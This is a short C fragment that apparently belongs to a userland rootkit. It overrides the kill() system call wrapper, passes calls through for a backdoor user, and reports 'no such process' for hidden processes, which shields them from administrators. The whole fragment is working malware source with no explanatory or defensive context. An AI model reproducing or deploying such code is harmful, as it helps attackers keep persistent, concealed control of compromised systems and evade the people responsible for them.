int kill(pid_t pid, int sig){
    hook(CKILL);
    if(is_bdusr()) return (long)call(CKILL, pid, sig);

    if(hidden_proc(pid)){
        errno = ESRCH;
        return -1;
    }

    return (long)call(CKILL, pid, sig);
}